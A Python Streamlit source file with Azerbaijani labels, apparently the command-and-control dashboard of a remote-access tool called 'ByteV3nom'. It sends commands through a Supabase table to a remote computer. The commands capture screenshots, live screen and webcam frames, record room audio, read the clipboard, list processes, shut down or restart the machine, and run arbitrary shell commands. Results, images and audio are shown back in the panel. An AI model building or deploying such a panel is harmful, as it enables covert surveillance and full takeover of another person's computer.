import os
import time
import streamlit as st
from supabase import create_client, Client

URL = os.environ.get("SUPABASE_URL", "https://sfshteybktaruvawmmsb.supabase.co")
KEY = os.environ.get("SUPABASE_KEY")

st.set_page_config(page_title="ByteV3nom Hub", layout="centered", page_icon="🐍")

# UI Stil Optimallaşdırılması
st.markdown("""
    
""", unsafe_allow_html=True)

st.title("🐍 ByteV3nom - İdarə Paneli")

if not KEY:
    st.error("⚠️ SUPABASE_KEY təyin edilməyib!")
    st.stop()

supabase: Client = create_client(URL, KEY)

def send_cmd(cmd):
    try:
        supabase.table("commands").insert({"command": cmd}).execute()
        st.toast(f"⚡ Əmr göndərildi: {cmd}")
    except Exception as e:
        st.error(f"Xəta: {e}")

# --- SÜRƏTLİ ƏMRLƏR (SİDEBAR) ---
st.sidebar.title("🎮 Sürətli İdarə")
col_s1, col_s2 = st.sidebar.columns(2)
with col_s1:
    if st.button("📸 Screen"): send_cmd("screenshot")
    if st.button("🔒 Kilidlə"): send_cmd("lock")
with col_s2:
    if st.button("📷 Kamera"): send_cmd("webcam")
    if st.button("🌙 Yuxu"): send_cmd("sleep")

st.sidebar.divider()
st.sidebar.subheader("🔊 Səs və Parlaqlıq")
vol = st.sidebar.slider("Səs (%)", 0, 100, 50)
if st.sidebar.button("Səsi Tənzimlə"): send_cmd(f"volume {vol}")

bright = st.sidebar.slider("Parlaqlıq (%)", 0, 100, 80)
if st.sidebar.button("Parlaqlığı Tənzimlə"): send_cmd(f"brightness {bright}")

# --- ƏSAS TABLAR ---
tab_media, tab_sys, tab_browser, tab_term = st.tabs(["🎥 Canlı & Media", "🖥️ Sistem", "🌐 Brauzer", "💻 Terminal"])

with tab_media:
    st.subheader("📹 Canlı İzləmə (Canlı Şəkil / Video Stream)")
    st.caption("Kompüterdən anlıq kadr almaq üçün düymələrə basın:")
    col_v1, col_v2 = st.columns(2)
    with col_v1:
        if st.button("🔴 Canlı Ekran Kadrı"): send_cmd("live_screen")
    with col_v2:
        if st.button("🔴 Canlı Kamera Kadrı"): send_cmd("live_cam")

    st.divider()
    st.subheader("🎙️ Ətrafın Səsini Yaz")
    rec_sec = st.number_input("Səs yazma müddəti (saniyə):", min_value=2, max_value=60, value=5)
    if st.button("🎙️ Səsi Yaz və Telefona Göndər"): send_cmd(f"record {rec_sec}")

with tab_sys:
    col_a, col_b = st.columns(2)
    with col_a:
        if st.button("📊 CPU & RAM Statusu"): send_cmd("sysinfo")
        if st.button("🔋 Batareya Statusu"): send_cmd("battery")
        if st.button("📋 Clipboard Oxu"): send_cmd("clipget")
    with col_b:
        if st.button("📝 İşləyən Proqramlar"): send_cmd("proc")
        if st.button("🛑 Kompüteri Söndür"): send_cmd("shutdown")
        if st.button("🔄 Yenidən Başlat"): send_cmd("restart")

with tab_browser:
    st.subheader("🌐 Brauzer Seçimi ilə Axtarış")
    b_type = st.selectbox("Brauzer Seçin:", ["chrome", "msedge", "firefox", "brave", "default"])
    q_str = st.text_input("Axtarılacaq söz və ya URL:")
    if st.button("🔍 Brauzerdə Aç"): send_cmd(f"search {b_type} {q_str}")

with tab_term:
    st.subheader("💻 Terminal / CMD")
    cmd_in = st.text_input("Komanda daxil edin (məsələn: ipconfig):")
    if st.button("⚡ İcra Et"): send_cmd(f"run {cmd_in}")

# --- NƏTİCƏLƏRİN TELEFONDA GÖRÜNMƏSİ ---
st.divider()
st.subheader("📱 Kompüterdən Gələn Nəticələr")

if st.button("🔄 Nəticələri Yenilə"):
    st.rerun()

try:
    res = supabase.table("commands").select("*").order("created_at", desc=True).limit(6).execute()
    for item in res.data:
        cmd_text = item.get("command")
        result_text = item.get("result", "İcra olunur...")
        file_url = item.get("file_url")

        with st.container():
            st.markdown(f"**⚡ Əmr:** `{cmd_text}`")
            st.info(result_text)
            if file_url:
                if any(file_url.endswith(ext) for ext in [".png", ".jpg", ".jpeg"]):
                    st.image(file_url, use_column_width=True)
                elif any(file_url.endswith(ext) for ext in [".wav", ".mp3"]):
                    st.audio(file_url)
            st.markdown("---")
except Exception as e:
    st.error(f"Xəta: {e}")
